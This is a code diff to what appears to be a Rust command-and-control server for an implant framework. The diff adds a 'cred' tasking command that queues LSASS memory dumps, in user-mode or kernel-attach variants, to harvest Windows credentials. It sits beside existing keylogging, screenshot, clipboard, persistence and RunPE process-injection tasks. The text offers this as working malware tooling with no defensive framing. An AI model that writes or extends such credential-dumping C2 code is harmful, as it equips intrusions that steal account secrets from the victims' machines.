@@ -2,8 +2,8 @@ use abraham_common::crypto::{self, ClientHello, Session};
 use abraham_common::frame::{open_frames, ProtocolError};
 use abraham_common::http::{read_request, write_response, HttpRequest, HDR_HANDSHAKE, HDR_SESSION};
 use abraham_common::message::{
-    self, collect_action, driver_action, msg, persist_action, Chunk, Message, RegisterInfo, Task,
-    TaskBody, TaskResult,
+    self, collect_action, cred_action, driver_action, msg, persist_action, Chunk, Message,
+    RegisterInfo, Task, TaskBody, TaskResult,
 };
 use abraham_common::profile::{Profile, DEFAULT_PROFILE_PATH};
 use ed25519_dalek::SigningKey;
@@ -1160,6 +1160,22 @@ async fn handle_mgmt(request: Value, state: &Arc<AppState>) -> Value {
             )
             .await
         }
+        "cred" => {
+            // ABR-T032/T033: LSASS minidump (user-mode / kernel-attach).
+            let action = match request.get("action").and_then(|v| v.as_str()) {
+                Some("user") => cred_action::LSASS_USER,
+                Some("kernel") => cred_action::LSASS_KERNEL,
+                _ => {
+                    return json!({ "error": "cred action must be user or kernel" });
+                }
+            };
+            let arg = request
+                .get("arg")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+            queue_task(state, &request, TaskBody::Cred { action, arg }).await
+        }
         "collect" => {
             // ABR-T031: screenshot / clipboard / keylog dump.
             let action = match request.get("action").and_then(|v| v.as_str()) {
@@ -1479,6 +1495,7 @@ fn task_kind_name(body: &TaskBody) -> &'static str {
         TaskBody::RunPe { .. } => "runpe",
         TaskBody::Persist { .. } => "persist",
         TaskBody::Collect { .. } => "collect",
+        TaskBody::Cred { .. } => "cred",
         TaskBody::Exit => "exit",
     }
 }
